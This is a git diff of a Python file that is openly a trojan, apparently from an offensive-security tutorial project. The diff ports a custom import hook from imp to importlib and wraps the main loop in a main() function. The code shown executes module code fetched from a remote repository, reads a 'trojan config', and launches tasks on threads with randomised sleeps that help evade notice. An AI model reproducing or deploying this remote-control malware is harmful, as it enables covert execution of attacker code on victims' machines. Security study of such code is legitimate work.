@@ -45,13 +45,11 @@ class GitImporter:
         return None
 
     def load_module(self, name):
-        module = imp.new_module(name)
-
-        # module = importlib.import_module('modules.{}'.format(name))
-
+        # importlib
+        module = importlib.import_module('modules.{}'.format(name))
+        # imp
+        # module = imp.new_module(name)
         exec(self.current_module_code, module.__dict__)
-        
-        # exec("self.current_module_code in module.__dict__")  #!?!?!?
         sys.modules[name] = module
         return module
 
@@ -113,17 +111,29 @@ def module_runner(module):
     return
 
 
-sys.meta_path = [GitImporter()]
+# importlib 
+sys.meta_path.append(GitImporter())
+
+# imp
+# sys.meta_path = [GitImporter()]
+
+def main():
+
+    
 
 
-while True:
-    if task_queue.empty():
+    while True:
+        if task_queue.empty():
 
-        config = get_trojan_config()
+            config = get_trojan_config()
 
-        for task in config:
+            for task in config:
 
-            t = threading.Thread(target=module_runner, args=(task["module"],))
-            t.start()
-            time.sleep(random.randint(1, 10))
-    time.sleep(random.randint(1000, 10000))
+                t = threading.Thread(target=module_runner, args=(task["module"],))
+                t.start()
+                time.sleep(random.randint(1, 10))
+        time.sleep(random.randint(1000, 10000))
+
+
+if __name__ == '__main__':
+    main()
